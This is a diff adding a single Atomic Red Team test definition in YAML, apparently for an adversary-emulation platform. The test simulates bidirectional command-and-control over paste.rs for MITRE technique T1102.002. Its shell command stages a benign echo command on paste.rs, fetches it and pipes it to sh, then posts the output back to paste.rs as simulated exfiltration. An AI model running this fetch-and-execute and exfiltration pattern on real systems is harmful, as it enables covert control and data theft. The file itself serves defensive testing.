@@ -1,0 +1,41 @@
+- id: ec9ab81c-8053-4957-8c66-0218381ab564
+  name: Bidirectional C2 Simulation via paste.rs (sh)
+  description: This test replicates a full bidirectional C2 flow using the public
+    paste.rs service...
+  tactic: command-and-control
+  technique:
+    attack_id: T1102.002
+    name: 'Web Service: Bidirectional Communication'
+  platforms:
+    linux:
+      sh:
+        command: 'STAGE_URL=$(curl -s -X POST -d "echo Simulated host discovery output"
+          "https://paste.rs"); echo "Command staged at: $STAGE_URL"; OUTPUT=$(curl
+          -s "$STAGE_URL" | sh 2>&1); echo "Fetched and executed command. Output:
+          $OUTPUT"; EXFIL_URL=$(echo "$OUTPUT" | curl -s -X POST --data-binary @-
+          "https://paste.rs"); echo "Results exfiltrated to: $EXFIL_URL"; echo "---
+          Attacker sees ---"; curl -s "$EXFIL_URL"'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1102.002
+  - command-and-control
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      safe_command:
+        description: Command to stage and execute (safe text only)
+        type: string
+        default: echo Simulated host discovery output
+      paste_service:
+        description: Base URL of the pastebin-like service
+        type: string
+        default: https://paste.rs
+    technique_created: '2020-03-14T22:34:03.024Z'
+    atomic_guid: ec9ab81c-8053-4957-8c66-0218381ab564
+    import_timestamp: '2026-06-24T06:04:21.641982Z'
